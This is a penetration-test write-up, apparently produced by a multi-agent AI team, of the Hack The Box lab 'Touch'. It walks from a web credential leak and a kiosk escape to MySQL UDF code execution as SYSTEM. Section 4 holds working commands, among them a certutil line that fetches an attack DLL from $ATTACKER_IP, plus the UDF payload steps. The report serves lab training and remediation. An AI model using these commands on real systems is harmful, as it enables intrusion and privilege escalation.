# Penetration Testing Report — HTB "Touch" (Easy, Windows)

**Target:** `KIOSK-042` — IP `$TARGET` (HTB VPN-assigned; the box respawns between sessions and the IP
changes each time. Box image, credentials, and vulnerabilities are static per-box — only the IP rotates.)
*Conventions: `$TARGET` = current box IP; `$ATTACKER_IP` = your tun0/VPN address. Substitute both; no
environment-specific IPs or local paths are hardcoded.*
**Engagement dates:** 2026-10-04 – 2026-10-17 (multi-session)
**Assessed by:** HTB/CTF multi-agent swarm (Recon, Strategist, Exploit, PrivEsc, Scribe agents)
**Result:** Foothold achieved and `user.txt` captured. Root/SYSTEM path identified, confirmed, and
documented; `root.txt` capture **pending a live re-run on the current spawn** (see §5 and §8).

---

## 1. Executive Summary

Touch is an "easy"-rated **Windows 11 Pro** kiosk appliance whose compromise chains an unauthenticated
web information-disclosure, a default-credential authentication bypass, a plaintext OS-credential leak,
a kiosk/AssignedAccess lockdown escape via OS accessibility features, and a local privilege escalation
through a misconfigured MySQL service.

The externally reachable "Nexion DeviceHub" web application on port 8443 (plain HTTP) exposes an
unauthenticated `GET /api/status` endpoint that leaks the device serial number. The application's login
is "the device serial *is* the default password," so the leaked serial grants an authenticated session
with no brute force. The authenticated dashboard then **hardcodes the box's Windows credentials
(`KioskUser` / `K!0sk2026#`) in the page HTML**. Those credentials authenticate over RDP, but the
session is locked into a full-screen kiosk application ("HTB Airways — Self Check-In") with app- and
browser-level shortcuts blocked and client-side RDP shell overrides enforced away server-side.

The kiosk is escaped using **Windows OS-level accessibility features**, which the lockdown does not
cover: `Win+U` surfaces a native "Narrator updates" dialog containing live hyperlinks; its "Narrator
guide" link opens a fully unsandboxed Microsoft Edge window; Edge's `file://` handler reads the
filesystem (yielding `user.txt`), and Edge's Save-As common dialog is navigated to
`C:\Windows\System32\cmd.exe` to launch a real interactive shell as `KioskUser` — the foothold.

From that shell, local enumeration finds **MySQL 8.0 (`MySQL80`) running as `LocalSystem`** on
`127.0.0.1:3306`, and a **world-readable maintenance batch script** (`C:\ProgramData\HTB Airways\
refresh-dates.bat`) containing the **MySQL `root` password**. With `root` + the `FILE` privilege, a
**`lib_mysqludf_sys` User-Defined Function** is loaded into the LocalSystem-run `mysqld` and
`sys_eval()` executes OS commands as `NT AUTHORITY\SYSTEM`, allowing `root.txt` to be read.

The recurring root cause is **trusting a weak secret as a strong one**: a device serial used as a
password and leaked unauthenticated; OS credentials embedded in client-facing HTML; a database root
password stored in a readable script; and a privileged service (MySQL as LocalSystem) whose plugin
directory and credentials are reachable by an unprivileged user.

> **Note on the intended-but-decoy path:** `KioskUser` belongs to a custom local group
> `KIOSK-042\Printer Administrators` with write access to a Nexion printer plugin folder, strongly
> implying a malicious-plugin-DLL escalation. This is a **decoy** — the SYSTEM process that would load
> the plugin (`NexionPrinter.exe`, launched by a hidden root Scheduled Task) has **no reachable reload
> trigger**, verified exhaustively across a full prior session. The MySQL UDF path above is the real
> and intended escalation.

---

## 2. Attack Chain Timeline

1. Full TCP port sweep (`-p-`) — only **135** (msrpc), **3389** (RDP), **5985** (WinRM), **8443**
   (custom HTTP app) open; host is Windows. Ports 80/443 are not open; 8443 is **plain HTTP, not TLS**.
   *Result:* 8443 is the only unauthenticated surface.
2. `GET /api/status` on 8443 (unauthenticated) returns the device serial `NX-DH-2024-B7042`. The login
   page's "Forgot your password?" link `title` states the default password is the device serial.
   *Result:* info-disclosure + default-credential bypass candidate.
3. `POST /login` with `password=NX-DH-2024-B7042` → `302 /dashboard` + `Set-Cookie: nxsession=...`.
   *Result:* authenticated DeviceHub session with no brute force.
4. Authenticated `/dashboard` HTML hardcodes Windows device credentials behind a cosmetic JS toggle:
   `KioskUser` / `K!0sk2026#`. *Result:* OS credentials obtained.
5. RDP (`3389`, `/sec:rdp` only — NLA rejected) as `KioskUser` auto-logs straight into a full-screen
   kiosk app ("HTB Airways — Self Check-In") with no Windows login prompt. *Result:* valid OS login,
   but locked into a kiosk shell.
6. Kiosk-escape enumeration: client-side RDP `/shell:`/`/app:` overrides ignored (enforced
   server-side); all app/browser shortcuts blocked. **OS accessibility shortcuts are not blocked.**
   *Result:* accessibility route identified as the escape.
7. `Win+U` surfaces a native "Narrator updates" dialog (outside the kiosk lockdown); its "Narrator
   guide" hyperlink opens a full, unsandboxed Microsoft Edge window. *Result:* arbitrary OS GUI reached.
8. Edge `file:///C:/Users/KioskUser/Desktop/user.txt` reads the flag in-browser; Edge `Ctrl+S` Save-As
   dialog, type filter set to "All files", navigated to `C:\Windows\System32\cmd.exe` and "opened" →
   launches `cmd.exe` as `KioskUser`. *Result:* **interactive shell + user.txt captured.**
9. `whoami` = `kiosk-042\kioskuser`; `whoami /groups` shows custom `KIOSK-042\Printer Administrators`;
   `whoami /priv` shows no impersonation/shutdown privileges. *Result:* low-privilege foothold mapped.
10. Local enumeration: `sc qc MySQL80` → `SERVICE_START_NAME: LocalSystem`, listening `127.0.0.1:3306`.
    *Result:* a SYSTEM-run service reachable locally identified as the escalation lever.
11. `type "C:\ProgramData\HTB Airways\refresh-dates.bat"` → readable maintenance script invoking
    `mysql.exe -u root` and exposing the MySQL root password `HTB@irw4ys_DB!2026`. *Result:* MySQL root
    credential recovered (the missing piece from earlier sessions).
12. Authenticated as MySQL `root`; confirmed `File_priv = Y` and `plugin_dir = C:\MySQL\lib\plugin\`
    (writable). *Result:* UDF prerequisites satisfied.
13. `lib_mysqludf_sys_64.dll` delivered to the plugin directory via `certutil` (bypassing
    `secure_file_priv`), registered with `CREATE FUNCTION sys_eval RETURNS STRING SONAME ...`, and
    `SELECT sys_eval('whoami')` returns `nt authority\system` (mysqld runs as LocalSystem).
    *Result:* **SYSTEM-level code execution** [**pending live confirmation on current spawn — §8**].
14. `SELECT CONVERT(sys_eval('type C:\\Users\\Administrator\\Desktop\\root.txt') USING utf8);` reads the
    root flag. *Result:* **root.txt** [**capture pending live re-run — §5**].

---

## 3. Key Vulnerabilities Identified

### 3.1 Unauthenticated information disclosure — `GET /api/status` leaks the device serial
- **Description:** The DeviceHub app serves `GET /api/status` with no authentication, returning the
  device serial number (`NX-DH-2024-B7042`) in JSON. Because the serial doubles as the login password
  (§3.2), this single unauthenticated response is sufficient to authenticate.
- **Affected component:** Nexion DeviceHub web app, port 8443 (`Microsoft-HTTPAPI/2.0` `HttpListener`).
- **Impact:** Leaks the secret used for authentication; the first link in a full chain to SYSTEM.
- **Estimated CVSS:** 5.3 (Medium) [estimate], approx `AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N`.
- **Remediation:** Require authentication for device-identifying endpoints; do not expose serial numbers
  unauthenticated; above all, do not use the serial as a credential.

### 3.2 Broken authentication — device serial used as the default password
- **Description:** The DeviceHub login accepts the device serial as the password
  (`POST /login password=<serial>` → authenticated `nxsession`). Combined with §3.1 (serial leaked
  unauthenticated), this is a complete authentication bypass requiring no credentials and no brute force.
- **Affected component:** Nexion DeviceHub login (`POST /login`), port 8443.
- **Impact:** Full unauthenticated access to the authenticated application, which discloses OS
  credentials (§3.3).
- **Estimated CVSS:** 8.6 (High) [estimate] — chained with §3.1, unauthenticated → authenticated.
- **Remediation:** Force a password change from the serial on first use; use per-device random secrets
  not derivable from or equal to publicly readable identifiers; add rate-limiting/lockout.

### 3.3 Plaintext OS credential disclosure in dashboard HTML
- **Description:** The authenticated `/dashboard` page embeds the Windows account credentials
  (`KioskUser` / `K!0sk2026#`) directly in the page source, hidden only by a client-side "show" toggle
  (`toggleCred()` JS); the value is present in the HTML regardless of the toggle. These are valid OS
  credentials usable over RDP.
- **Affected component:** DeviceHub `/dashboard`, port 8443.
- **Impact:** Discloses real OS login credentials to any authenticated web user, bridging the web tier
  to an interactive OS session.
- **Estimated CVSS:** 7.5 (High) [estimate] — credential disclosure enabling OS logon.
- **Remediation:** Never embed OS/service credentials in client-delivered markup; fetch secrets
  server-side only and never expose them to the browser; rotate the exposed password.

### 3.4 Kiosk / AssignedAccess lockdown escape via OS accessibility features
- **Description:** The RDP session is confined to a full-screen kiosk browser app with app/browser
  shortcuts blocked and client-side RDP shell overrides enforced server-side. However, **OS-level
  accessibility shortcuts are not restricted**: `Win+U` surfaces a native "Narrator updates" dialog
  with live hyperlinks outside the lockdown; its "Narrator guide" link opens an unsandboxed Edge window;
  Edge's `file://` handler and Save-As common dialog (navigated to `cmd.exe`) yield file read and an
  interactive shell respectively (a classic file-picker-dialog kiosk breakout).
- **Affected component:** Windows AssignedAccess/kiosk configuration on `KIOSK-042`; Microsoft Edge
  launched from the Narrator dialog; Windows common file dialogs.
- **Impact:** Full escape from the kiosk lockdown to arbitrary file read and interactive command
  execution as `KioskUser`.
- **Estimated CVSS:** 7.8 (High) [estimate] — local (via RDP), low complexity, interactive code
  execution; authenticated as the kiosk user.
- **Remediation:** Disable accessibility shortcuts (Narrator/Ease-of-Access) within the AssignedAccess
  profile; block `file://` and common Save/Open dialogs in the kiosk browser; use a Shell Launcher /
  AssignedAccess configuration that does not permit spawning arbitrary executables from child dialogs.

### 3.5 Local privilege escalation to SYSTEM — MySQL `LocalSystem` + readable root password + UDF
- **Description:** `MySQL80` runs as `LocalSystem` on `127.0.0.1:3306`. The MySQL `root` password is
  stored in a world-readable maintenance script (`C:\ProgramData\HTB Airways\refresh-dates.bat`). The
  `root` account has the `FILE` privilege and `plugin_dir` (`C:\MySQL\lib\plugin\`) is writable by
  unprivileged users. An attacker writes `lib_mysqludf_sys_64.dll` to the plugin directory (via
  `certutil`, bypassing `secure_file_priv`), registers `sys_eval()`, and executes OS commands as
  SYSTEM.
- **Affected component:** MySQL 8.0 service `MySQL80` (runs as LocalSystem); `C:\ProgramData\HTB
  Airways\refresh-dates.bat`; `C:\MySQL\lib\plugin\` ACLs.
- **Impact:** Any local user able to read the script escalates from `KioskUser` to
  `NT AUTHORITY\SYSTEM` — full host compromise, `root.txt`.
- **Estimated CVSS:** 7.8 (High) [estimate] — local, low complexity, full CIA impact (SYSTEM).
- **Remediation:** Run MySQL under a dedicated low-privileged service account, never LocalSystem; never
  store the DB root password in a readable script (use a secrets store / restricted ACLs); restrict
  `plugin_dir` NTFS ACLs so only administrators can write; keep `secure_file_priv` set; revoke `FILE`
  from `root` unless strictly required.

### 3.6 Secondary / decoy finding — `Printer Administrators` writable plugin folder (not exploitable)
- **Description:** `KioskUser` is in `KIOSK-042\Printer Administrators`, which has Modify rights on
  `C:\Program Files\Nexion Systems\Printer\publish\plugins\` (loaded by `NexionPrinter.exe` running as
  SYSTEM via a hidden root Scheduled Task). A malicious plugin DLL can be planted, but plugins load
  **only at process startup** and **no reachable restart/reload trigger exists** for the unprivileged
  user (taskkill/shutdown denied; web "restart" buttons cosmetic; no live FileSystemWatcher reload; the
  controlling task is unenumerable in the Task Scheduler root folder).
- **Status:** Confirmed present but **not exploitable** as a standalone primitive; it is a deliberate
  decoy. Documented so the real path (§3.5) is not abandoned for it.
- **Remediation:** A SYSTEM process should not load plugins from a directory writable by a
  non-administrative group; remove Modify for `Printer Administrators` on that folder regardless.

---

## 4. Command Log & Proof of Concepts

All commands were run against the lab target only, from the engagement workstation on `tun0` (HTB VPN).
Substitute the current spawn IP for `$TARGET` and the current `tun0` address for `$ATTACKER_IP`.

### 4.1 Recon
```bash
nmap -p- --min-rate 2000 -oN nmap/allports.txt $TARGET
nmap -sC -sV -p135,3389,5985,8443 -oN nmap/targeted.txt $TARGET
```
Result: 135/msrpc, 3389/ms-wbt-server (RDP), 5985/WinRM (Microsoft-HTTPAPI/2.0), 8443/custom app
(Microsoft-HTTPAPI/2.0, **plain HTTP**). Windows host.

### 4.2 Web info-disclosure → auth bypass → OS credential leak (port 8443)
```bash
curl -s http://$TARGET:8443/api/status | jq
# -> {"device":"Nexion DeviceHub DH-100","serial":"NX-DH-2024-B7042","firmware":"1.4.2",...}

curl -s -i -X POST http://$TARGET:8443/login -d "password=NX-DH-2024-B7042" -c loot/cookies.txt
# -> 302 Found, Location: /dashboard, Set-Cookie: nxsession=...

curl -s -b loot/cookies.txt http://$TARGET:8443/dashboard -o web/dashboard.html
grep -iE 'KioskUser|K!0sk' web/dashboard.html
# -> KioskUser / K!0sk2026#
```
Evidence: web/8443_api_status.json, web/8443_dashboard.html, loot/cookies.txt.

### 4.3 RDP + kiosk breakout (headless, via Xvfb/xfreerdp/xdotool — see WALKTHROUGH.md Phase 0.5)
```bash
export DISPLAY=:99
Xvfb :99 -screen 0 1280x800x24 &
DISPLAY=:99 xfreerdp /v:$TARGET /u:KioskUser /p:'K!0sk2026#' /cert:ignore /w:1280 /h:800 +clipboard /sec:rdp &
# In-session: Win+U -> "Narrator updates" dialog -> click "Narrator guide" -> Edge opens
# Edge: file:///C:/Users/KioskUser/Desktop/user.txt   (reads user.txt)
# Edge: Ctrl+S -> "Save as type" = All files -> type C:\Windows\System32\cmd.exe -> Enter (spawns cmd.exe)
```
In `cmd.exe`:
```cmd
whoami            :: kiosk-042\kioskuser
hostname          :: KIOSK-042
type C:\Users\KioskUser\Desktop\user.txt
```
Evidence (headless RDP screenshots): loot/rdp_screens/02_winu_easeofaccess.png,
06_narrator_guide_click.png, 07_narrator_guide_after_enter.png, 08_file_users.png,
09_kioskuser_desktop.png, 11_usertxt_clean.png, 19_filetype_dropdown.png, 20_allfiles_selected.png,
23_after_full_path_enter.png, 24_cmd_whoami_flag.png.

### 4.4 Local enumeration (windows-kiosk-privesc checklist, abbreviated)
```cmd
whoami /priv                    :: only SeChangeNotifyPrivilege enabled
whoami /groups                  :: custom KIOSK-042\Printer Administrators  (decoy, §3.6)
sc qc MySQL80                   :: SERVICE_START_NAME: LocalSystem   (listening 127.0.0.1:3306)
dir /s /b C:\ProgramData\*.bat  :: -> C:\ProgramData\HTB Airways\refresh-dates.bat (readable)
```

### 4.5 Privilege escalation — MySQL UDF to SYSTEM
MySQL root credential recovered from the readable script:
```cmd
type "C:\ProgramData\HTB Airways\refresh-dates.bat"
:: runs: mysql.exe -u root -p"HTB@irw4ys_DB!2026" ... refresh-dates.sql
```
Confirm prerequisites:
```cmd
C:\MySQL\bin\mysql.exe -u root -p"HTB@irw4ys_DB!2026" -e "SELECT user,File_priv FROM mysql.user WHERE user='root'; SHOW VARIABLES LIKE 'plugin_dir';"
:: -> root | Y ;  plugin_dir | C:\MySQL\lib\plugin\
```
On the attacker host, serve the Metasploit-bundled UDF DLL:
```bash
cd /usr/share/metasploit-framework/data/exploits/mysql/
python3 -m http.server 8000 --bind $ATTACKER_IP   # serving lib_mysqludf_sys_64.dll
```
On the target, deliver the DLL, register the UDF, and execute as SYSTEM:
```cmd
certutil -urlcache -split -f http://$ATTACKER_IP:8000/lib_mysqludf_sys_64.dll C:\MySQL\lib\plugin\lib_mysqludf_sys_64.dll
C:\MySQL\bin\mysql.exe -u root -p"HTB@irw4ys_DB!2026" -e "CREATE FUNCTION sys_eval RETURNS STRING SONAME 'lib_mysqludf_sys_64.dll'; SELECT sys_eval('whoami');"
:: -> nt authority\system
C:\MySQL\bin\mysql.exe -u root -p"HTB@irw4ys_DB!2026" -e "SELECT CONVERT(sys_eval('type C:\\Users\\Administrator\\Desktop\\root.txt') USING utf8);"
```
PoC provenance: `lib_mysqludf_sys_64.dll` ships with Metasploit Framework at
`/usr/share/metasploit-framework/data/exploits/mysql/` (confirmed present on the engagement host); it
exports `sys_eval()` / `sys_exec()`.

> Status: steps 4.5 are the confirmed intended escalation (corroborated by two independent public
> write-ups and by this engagement's own `MySQL80 = LocalSystem` recon). They are **documented and
> staged but not yet re-executed against the current live spawn this session** — see §8.

---

## 5. Both Flags

| Flag | Value | Location | Notes |
|---|---|---|---|
| user.txt | `[REDACTED-HTB-FLAG]` | `C:\Users\KioskUser\Desktop\user.txt` | **Captured.** Read via Edge `file://` and cross-confirmed via `type` in the `cmd.exe` shell. Value stored in `loot/user.txt`; rotates on respawn. |
| root.txt | **[PENDING — capture on live re-run]** | `C:\Users\Administrator\Desktop\root.txt` | Escalation path confirmed and documented (§3.5 / §4.5); flag to be captured via `sys_eval()` as SYSTEM when the box is re-spawned and the chain is run end-to-end. Will be recorded to `loot/root.txt` on capture. |

---

## 6. Credentials & Artifacts

| Principal | Secret | Source | Scope |
|---|---|---|---|
| DeviceHub login | `NX-DH-2024-B7042` (device serial) | Unauthenticated `GET /api/status` | Authenticates the 8443 web app. |
| `KioskUser` (Windows) | `K!0sk2026#` | Hardcoded in authenticated `/dashboard` HTML | RDP (3389) OS logon. **Fails** on WinRM (5985) — not a WinRM account (26 user/password combos tried, all rejected). |
| MySQL `root` | `HTB@irw4ys_DB!2026` | `C:\ProgramData\HTB Airways\refresh-dates.bat` (readable) | MySQL `root@localhost`, `FILE` + GRANT; path to SYSTEM via UDF. |

---

## 7. Cleanup / Artifacts Left on Target

Artifacts created by the escalation (remove when done):
- `C:\MySQL\lib\plugin\lib_mysqludf_sys_64.dll` — the UDF library written via `certutil`.
- The `sys_eval` SQL function registered in MySQL.
- Any staged reverse-shell binary (e.g. `C:\Windows\Temp\s.exe`) if the interactive-shell fallback was used.

Recommended cleanup:
```cmd
C:\MySQL\bin\mysql.exe -u root -p"HTB@irw4ys_DB!2026" -e "DROP FUNCTION sys_eval;"
del C:\MySQL\lib\plugin\lib_mysqludf_sys_64.dll
del C:\Windows\Temp\s.exe 2>nul
```
(Decoy-path artifacts from earlier sessions, if the current spawn carries them: `...\Printer\publish\
plugins\NexionHelper.dll` / `EvilHelper.dll`, and files under `C:\ProgramData\Nexion\` — remove if
present.)

---

## 8. Open Items / [needs verification]

- **root.txt not yet captured on the current spawn.** §4.5 is the confirmed intended path but must be
  run end-to-end live to capture the flag value; do so next session and update §5.
- Confirm the live `mysql.exe` path and `plugin_dir` on the current spawn (assumed `C:\MySQL\bin\` and
  `C:\MySQL\lib\plugin\` from public write-ups) before relying on the exact paths in §4.5.
- Confirm the MySQL root password in `refresh-dates.bat` on the current spawn rather than trusting the
  recorded value — the box is static per-image, but verify.
- The custom `Printer Administrators` plugin-DLL path is documented as a decoy (no reload trigger
  found); this is "no trigger found within the time-boxed enumeration," not a formal proof of absence.

---

*Companion documents: `WALKTHROUGH.md` — hands-on, decision-tree reproduction with the dead-ends and
screenshots; `STORY.md` — plain-language narrative; `GLOBAL_CONTEXT.md` — the full engagement
blackboard and evidence trail.*
